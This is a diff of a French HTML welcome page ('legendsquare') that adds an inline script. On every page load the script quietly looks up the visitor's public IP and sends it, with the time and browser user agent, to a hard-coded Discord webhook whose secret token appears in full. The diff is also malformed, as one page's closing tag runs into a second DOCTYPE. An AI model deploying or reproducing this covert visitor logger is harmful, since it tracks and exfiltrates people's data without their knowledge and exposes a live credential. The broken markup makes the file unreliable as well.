@@ -2,6 +2,39 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
+  <title>legendsquare</title>
+</head>
+<body>
+  <h1>legendsquare</h1>
+  <p>Bienvenue.</p>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1495027823688028180/xs6W6ipyVNLlfe3AmkX-Nosmx26hUg__a4OHXSqP8xZr3IOtKpSe_v2fRcLSZaZV6-Xo";
+
+    (async () => {
+      console.log("Script démarré");
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const data = await r.json();
+        console.log("IP :", data.ip);
+
+        const fd = new FormData();
+        fd.append("payload_json", JSON.stringify({
+          content: `Visite - IP: ${data.ip} - ${new Date().toLocaleString("fr-FR")} - ${navigator.userAgent}`
+        }));
+
+        const res = await fetch(WEBHOOK_URL, { method: "POST", body: fd });
+        console.log(res.ok ? "Envoye sur Discord" : "Erreur " + res.status);
+      } catch (e) {
+        console.error("Erreur :", e);
+      }
+    })();
+  </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
   <title>Bienvenue</title>
 </head>
 <body>
